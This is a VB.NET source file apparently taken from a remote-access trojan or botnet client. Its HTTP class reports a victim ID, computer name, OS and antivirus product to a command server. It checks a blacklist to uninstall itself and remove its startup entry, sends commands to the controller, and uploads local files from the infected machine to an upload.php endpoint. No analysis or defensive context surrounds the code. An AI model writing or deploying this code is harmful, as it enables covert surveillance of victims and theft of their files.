﻿Imports System.Management
Imports System.Net
Imports System.Text

Public Class HTTP
    Public ID As String
    Public Host As String
    Public Sub Connect()
        Try
            _GET("connection.php?vicID=" & ID & "&cpname=" & My.Computer.Name & "&os=" & My.Computer.Info.OSFullName & "&antivirus=" & Form1.GetAntiVirus() & "&status=Online")
            If Form1.checkBlacklist() = True Then
                Send("Uninstall")
                DStartup(Form1.StartName)
                Application.Exit()
            End If
        Catch ex As Exception

        End Try
    End Sub
    Public Function _GET(ByVal request As String)
        Dim GETRequest As WebClient = New WebClient
        GETRequest.DownloadString(Host & "/" & request)
    End Function
    Public Function _POST(ByVal requst As String)
        Dim s As HttpWebRequest
        Dim enc As UTF8Encoding
        Dim postdata As String
        Dim postdatabytes As Byte()
        s = HttpWebRequest.Create(Host & "/" & "post.php")
        enc = New System.Text.UTF8Encoding()
        postdata = requst
        postdatabytes = enc.GetBytes(postdata)
        s.Method = "POST"
        s.ContentType = "application/x-www-form-urlencoded"
        s.ContentLength = postdatabytes.Length

        Using stream = s.GetRequestStream()
            stream.Write(postdatabytes, 0, postdatabytes.Length)
        End Using
        Dim result = s.GetResponse()
        Return result
    End Function
    Function Send(ByVal Command As String)
        Try
            Dim SendCMD As New WebClient
            SendCMD.DownloadString(Host & "/" & "receive.php?command=" & Command & "&vicID=" & ID)
            Return True
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Public Sub Upload(ByVal Filepath As String)
        On Error Resume Next
        My.Computer.Network.UploadFile(Filepath, Host & "/upload.php?id=" & ID)
    End Sub
End Class